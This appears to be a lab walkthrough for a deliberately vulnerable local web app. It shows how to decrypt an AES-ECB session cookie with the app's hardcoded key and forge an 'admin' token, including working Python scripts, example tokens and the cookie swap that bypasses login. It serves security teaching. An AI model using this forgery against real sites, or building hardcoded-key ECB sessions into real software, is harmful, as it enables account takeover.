## Vulnerability Testing Guide

### Prerequisites:

- Python with `pycryptodome` installed
- The lab app running at `http://localhost:5000`
- Access to browser dev tools or Burp Suite

---

### Step 1: Log in as a Normal User

1. Go to `http://localhost:5000`
2. Use these credentials:

```
Username: user Password: user123
```

#### After logging in, open **Developer Tools → Application → Cookies** and copy the `session` cookie value.

T4HnG4zW93EKfs0gBciClA==`

---

### Step 2: Decrypt the Cookie Token

Create a Python script to decrypt the session token using the known hardcoded key and ECB mode:

```python
from Crypto.Cipher import AES
import base64

SECRET_KEY = b'SECRET_KEY_12345'

def unpad(s):
    return s[:-ord(s[-1])]

def decrypt_token(token):
    cipher = AES.new(SECRET_KEY, AES.MODE_ECB)
    decrypted = cipher.decrypt(base64.b64decode(token))
    return unpad(decrypted.decode())

token = input("Paste session cookie: ")
print("[*] Decrypted session:", decrypt_token(token))

```

### Expected Output

```
Paste session cookie: T4HnG4zW93EKfs0gBciClA== [*] Decrypted session: user
```

---
###  Step 3: Craft a Malicious Admin Token

Now that you understand how encryption works in the app, you can impersonate another user (e.g., `admin`) by encrypting that string yourself.

Use this script:
```python
from Crypto.Cipher import AES
import base64

SECRET_KEY = b'SECRET_KEY_12345'

def pad(s):
    pad_len = 16 - len(s) % 16
    return s + chr(pad_len) * pad_len

def encrypt_token(username):
    cipher = AES.new(SECRET_KEY, AES.MODE_ECB)
    padded = pad(username)
    encrypted = cipher.encrypt(padded.encode())
    return base64.b64encode(encrypted).decode()

print("[*] Generated session token:", encrypt_token("admin"))
```


### Output Example


```
[*] Generated session token: 8YebqTMLHZn0Q7oF7WyvZg==
```

---

### Step 4: Replace the Cookie & Bypass Auth

1. In your browser or Burp Suite, replace the current cookie:

```
session=8YebqTMLHZn0Q7oF7WyvZg==
```

1. Refresh `/dashboard`.

2. You should now see:
  
```
Welcome, admin!